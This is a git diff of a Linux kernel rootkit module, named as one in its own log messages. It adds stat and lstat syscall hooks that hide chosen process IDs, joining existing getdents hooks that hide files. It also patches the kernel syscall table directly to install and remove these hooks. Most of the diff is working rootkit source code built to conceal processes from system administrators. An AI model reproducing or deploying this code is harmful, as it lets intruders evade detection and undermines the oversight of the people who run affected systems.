@@ -74,7 +74,8 @@ unsigned long *syscall_table = NULL;
 
 hook_define(3, long, getdents, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count);
 hook_define(3, long, getdents64, unsigned int, fd, struct linux_dirent64 __user*, dirent, unsigned int, count);
-
+hook_define(2, long, stat, const char __user*, filename, struct __old_kernel_stat __user*, statbuf);
+hook_define(2, long, lstat, const char __user*, filename, struct __old_kernel_stat __user*, statbuf);
 
 asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user* dirent, unsigned int count, long ret) {
 	int buff_offset, deleted_size;
@@ -164,6 +165,27 @@ asmlinkage long sys_getdents64_do_hook(unsigned int fd, struct linux_dirent64 __
 	return ret;
 }
 
+asmlinkage long sys_stat_do_hook(const char __user *pathname, struct __old_kernel_stat __user *statbuf, long ret){
+	//printk(KERN_INFO "ROOTKIT: hello from stat\n");
+	struct list_pids_node* node;
+	char pid_str[8];
+	const char* filename;
+	list_for_each_entry(node, &list_pids, list){
+		snprintf(pid_str, sizeof(pid_str), "%d", node->pid);
+		filename = kbasename(pathname); //WARNING: I think it won't work if pathname ends with '/'
+		if (strcmp(pid_str, filename) == 0){
+			printk(KERN_INFO "ROOTKIT: AIBAA %s\n", pid_str);
+			return -ENOENT;
+		}
+	}
+	return ret;
+}
+
+asmlinkage long sys_lstat_do_hook(const char __user *pathname, struct __old_kernel_stat __user *statbuf, long ret){
+	//printk(KERN_INFO "ROOTKIT: hello from stat\n");
+	return sys_stat_do_hook(pathname, statbuf, ret);
+}
+
 //__init para que solo lo haga una vez y después pueda sacarlo de memoria
 int __init hooks_init(void){
 	if ((syscall_table = (void *)kallsyms_lookup_name("sys_call_table")) == 0){
@@ -175,10 +197,14 @@ int __init hooks_init(void){
 
 	sys_getdents_orig = (void*)syscall_table[__NR_getdents];
 	sys_getdents64_orig = (void*)syscall_table[__NR_getdents64];
+	sys_stat_orig = (void*)syscall_table[__NR_stat];
+	sys_lstat_orig = (void*)syscall_table[__NR_lstat];
 
 	ENABLE_WRITE();
 	if (HOOK_GETDENTS) syscall_table[__NR_getdents] = sys_getdents_hook;
 	if (HOOK_GETDENTS64) syscall_table[__NR_getdents64] = sys_getdents64_hook;
+	if (HOOK_STAT) syscall_table[__NR_stat] = sys_stat_hook;
+	if (HOOK_LSTAT) syscall_table[__NR_lstat] = sys_lstat_hook;
 	DISABLE_WRITE();
 
 	printk(KERN_INFO "ROOTKIT: Finished hooks\n");
@@ -190,13 +216,20 @@ void __exit hooks_exit(void){
 	ENABLE_WRITE();
 	if (HOOK_GETDENTS) syscall_table[__NR_getdents] = sys_getdents_orig;
 	if (HOOK_GETDENTS64) syscall_table[__NR_getdents64] = sys_getdents64_orig;
+	if (HOOK_STAT) syscall_table[__NR_stat] = sys_stat_orig;
+	if (HOOK_LSTAT) syscall_table[__NR_lstat] = sys_lstat_orig;
 	DISABLE_WRITE();
 
-	// delete list
-	struct list_files_node* node, *tmp;
-	list_for_each_entry_safe(node, tmp, &list_files, list){
-		list_del(&node->list);
-		kfree(node);
+	// delete lists
+	struct list_files_node *node_file, *tmp_file;
+	struct list_pids_node *node_pid, *tmp_pid;
+	list_for_each_entry_safe(node_file, tmp_file, &list_files, list){
+		list_del(&node_file->list);
+		kfree(node_file);
+	}
+	list_for_each_entry_safe(node_pid, tmp_pid, &list_pids, list){
+		list_del(&node_pid->list);
+		kfree(node_pid);
 	}
 }
 
@@ -266,7 +299,7 @@ int unhide_pid(int pid){
 			return 0;
 		}
 	}
-	printk(KERN_INFO "ROOTKIT: ERROR trying to hide not found pid %d\n", pid);
+	printk(KERN_INFO "ROOTKIT: ERROR trying to unhide not found pid %d\n", pid);
 	return -1;
 	/*char pid_s[8];
 	snprintf(pid_s, sizeof(pid_s), "%d", pid);
